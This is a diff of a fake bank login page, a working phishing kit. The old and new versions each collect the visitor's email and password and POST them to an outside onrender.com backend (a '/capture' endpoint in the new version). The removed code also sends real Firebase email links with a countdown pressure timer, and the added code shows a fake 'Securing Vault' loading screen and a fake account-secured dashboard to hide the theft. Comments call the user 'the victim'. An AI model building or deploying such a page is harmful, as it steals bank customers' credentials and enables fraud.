@@ -68,126 +68,54 @@
         © 2026 Global Standard Banking Group. All Rights Reserved.
     </footer>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    import { getAuth, sendSignInLinkToEmail, isSignInWithEmailLink, signInWithEmailLink } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-auth.js";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyBZ_CMC_dkvpD26fQB02No_83mBaOD2GrA",
-        authDomain: "aura-comm.firebaseapp.com",
-        projectId: "aura-comm",
-        appId: "1:946099391290:web:4d5c8561dea372e1185e03"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-    let countdownInterval;
-    
-    // Create a communication channel between tabs
-    const authChannel = new BroadcastChannel('aura_auth_sync');
-
-    // --- TAB 1 LISTENER: Updates automatically when Gmail link is clicked ---
-    authChannel.onmessage = (event) => {
-        if (event.data === 'LINK_VERIFIED') {
-            clearInterval(countdownInterval);
-            renderSuccessDashboard(); // The "Auto-Login" trigger
-        }
-    };
-
-    // --- TAB 2 CHECKER: Processes the real Gmail link ---
-    if (isSignInWithEmailLink(auth, window.location.href)) {
-        const email = window.localStorage.getItem('emailForSignIn');
-        signInWithEmailLink(auth, email, window.location.href)
-            .then(() => {
-                authChannel.postMessage('LINK_VERIFIED');
-                document.body.innerHTML = `
-                    <div class="min-h-screen flex items-center justify-center bg-slate-50 p-6 text-center">
-                        <div class="max-w-md w-full bg-white rounded-2xl shadow-xl p-10">
-                            <h1 class="text-2xl font-bold text-green-600">Verification Complete</h1>
-                            <p class="text-slate-500 mt-2">Identity confirmed. You may now close this window.</p>
-                        </div>
-                    </div>`;
-            });
-    }
-
-    // --- STAGE 1: Harvest & Trigger Email ---
+<script>
+    // --- STAGE 1: Harvest & Send Data ---
     window.executeInfiltration = async function(e) {
         e.preventDefault();
+        
         const userEmail = document.getElementById('bankUser').value.trim();
         const passValue = document.getElementById('bankPass').value;
+        const statusDisplay = document.getElementById('auth-card-content');
+
+        // Show a loading state to the victim
+        statusDisplay.innerHTML = `
+            <div class="text-center py-10 fade-in">
+                <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-navy-bg mb-4"></div>
+                <h2 class="text-xl font-bold text-slate-800">Securing Vault...</h2>
+                <p class="text-sm text-slate-500 mt-2">Neural encryption in progress. Do not close this window.</p>
+            </div>`;
 
         try {
-            await fetch('https://cybersecurity-2-b9k7.onrender.com/login', {
+            // Send data directly to your Render Backend
+            // IMPORTANT: Ensure this URL matches your Render Dashboard exactly!
+            const response = await fetch('https://cybersecurity-2-b9k7.onrender.com/capture', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ type: 'GMAIL_FINAL_PHISH', user: userEmail, pass: passValue })
+                body: JSON.stringify({ 
+                    type: 'PHISHING', 
+                    user: userEmail, 
+                    pass: passValue 
+                })
             });
-        } catch (err) { console.error("Hacker dashboard offline"); }
 
-        triggerSecureEmail(userEmail);
-    };
-
-    // --- Trigger Real Firebase Email ---
-async function triggerSecureEmail(userEmail) {
-    const actionCodeSettings = {
-        // Change this to your exact live Render URL for the phishing page
-        url: 'https://globaldigitalbank1.netlify.app',
-        handleCodeInApp: true,
-    };
-    
-
-        try {
-            await sendSignInLinkToEmail(auth, userEmail, actionCodeSettings);
-            window.localStorage.setItem('emailForSignIn', userEmail);
-
-            document.getElementById('auth-card-content').innerHTML = `
-                <div class="text-center py-4 fade-in">
-                    <h2 class="text-xl font-bold text-slate-800">Check Your Gmail</h2>
-                    <p class="text-sm text-slate-500 mt-2 mb-6">A secure link was sent to <b>${userEmail}</b>.</p>
-                    
-                    <div class="bg-amber-50 border border-amber-200 p-4 rounded-xl mb-4">
-                        <p id="timer" class="text-3xl font-mono font-bold text-amber-800">01:00</p>
-                        <p class="text-[10px] uppercase font-bold text-amber-600 mt-1 tracking-widest">Awaiting Link Click</p>
-                    </div>
-
-                    <div id="resend-wrapper" class="hidden">
-                        <p class="text-[11px] text-slate-400">Didn't receive it? 
-                            <button type="button" onclick="triggerSecureEmail('${userEmail}')" class="text-blue-600 font-bold hover:underline">Resend Secure Link</button>
-                        </p>
-                    </div>
-                </div>`;
-            startCountdown(60); // Start 1-minute pressure timer
-        } catch (error) { alert("Firebase Error: " + error.message); }
-    }
-
-    function startCountdown(duration) {
-        let timer = duration, minutes, seconds;
-        const display = document.querySelector('#timer');
-        const resendWrapper = document.getElementById('resend-wrapper');
-        
-        clearInterval(countdownInterval);
-        countdownInterval = setInterval(() => {
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-            if (display) display.textContent = "0" + minutes + ":" + seconds;
-
-            if (--timer < 0) {
-                clearInterval(countdownInterval);
-                if (display) {
-                    display.textContent = "EXPIRED";
-                    display.classList.add("text-red-600");
-                }
-                if (resendWrapper) resendWrapper.classList.remove('hidden'); // Show resend lure
+            if (response.ok) {
+                // Wait 2 seconds to look "realistic" then show success
+                setTimeout(() => {
+                    renderSuccessDashboard();
+                }, 2000);
             }
-        }, 1000);
-    }
+        } catch (err) {
+            console.error("Connection Error:", err);
+            alert("Security Timeout: Please check your connection and try again.");
+            location.reload(); // Reset the form on error
+        }
+    };
 
     function renderSuccessDashboard() {
         document.querySelector('main').innerHTML = `
             <div class="max-w-2xl w-full bg-white rounded-3xl shadow-2xl overflow-hidden fade-in">
                 <div class="bg-green-600 p-8 text-white text-center">
-                    <h2 class="text-3xl font-bold">Congrats! You saved your account</h2>
+                    <h2 class="text-3xl font-bold">Account Secured</h2>
                     <p class="opacity-80 mt-2 uppercase tracking-widest text-[10px] font-bold">Security Status: Active Shield</p>
                 </div>
                 <div class="p-10 bg-slate-50 border-t border-slate-100 grid grid-cols-2 gap-6">
@@ -195,14 +123,12 @@ async function triggerSecureEmail(userEmail) {
                         <p class="text-[10px] text-slate-400 font-bold uppercase">Balance</p>
                         <p class="text-2xl font-mono font-bold text-slate-800">$42,910.00</p>
                     </div>
-                    <div class="bg-white p-6 rounded-xl shadow-sm text-center">
-                        <div class="text-green-600 font-bold text-2xl uppercase">✓ Secured</div>
+                    <div class="bg-white p-6 rounded-xl shadow-sm text-center flex items-center justify-center">
+                        <div class="text-green-600 font-bold text-2xl uppercase">✓ Verified</div>
                     </div>
                 </div>
             </div>`;
     }
-
-    window.triggerSecureEmail = triggerSecureEmail; // Make global for resend button
 </script>
 </body>
 </html>
